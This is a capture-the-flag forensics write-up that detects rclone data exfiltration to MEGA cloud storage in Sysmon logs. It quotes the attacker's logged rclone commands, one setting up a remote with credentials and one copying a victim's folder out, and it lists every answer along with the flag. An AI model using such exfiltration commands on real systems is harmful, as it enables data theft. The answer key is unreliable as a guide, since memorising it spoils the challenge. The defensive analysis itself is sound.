# forensics/Packet Cyclone

### Description
> Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade's research to the cloud. Using the tool called "chainsaw" and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon? To get the flag, you need to start and connect to the docker service and answer all the questions correctly.

We have a folder with sigma rules for malware and a folder with Windows logs (.evtx)

I used this tool to read Windows logs(sigma rules didn't work for me):
https://github.com/omerbenamram/evtx

In file `Microsoft-Windows-Sysmon%4Operational.evtx` in record 76 we can find answers for questions 1-4:

```
<Data Name="CommandLine">"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI</Data>
```

1.What is the email of the attacker used for the exfiltration process? (for example: name@email.com)

majmeret@protonmail.com

2.What is the password of the attacker used for the exfiltration process? (for example: password123)

FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI

3.What is the Cloud storage provider used by the attacker? (for example: cloud)

mega

4.What is the ID of the process used by the attackers to configure their tool? (for example: 1337)

3820

In the same file in record 78 we can find answers for questions 5-6:
```
<Data Name="CommandLine">"C:\Users\wade\AppData\Local\Temp\rclone-v1.61.1-windows-amd64\rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v</Data>
```

5.What is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\Users\user\folder)

C:\Users\Wade\Desktop\Relic_location

6.What is the name of the folder the attacker exfiltrated the files to? (for example: exfil_folder)

exfiltration

*HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}*

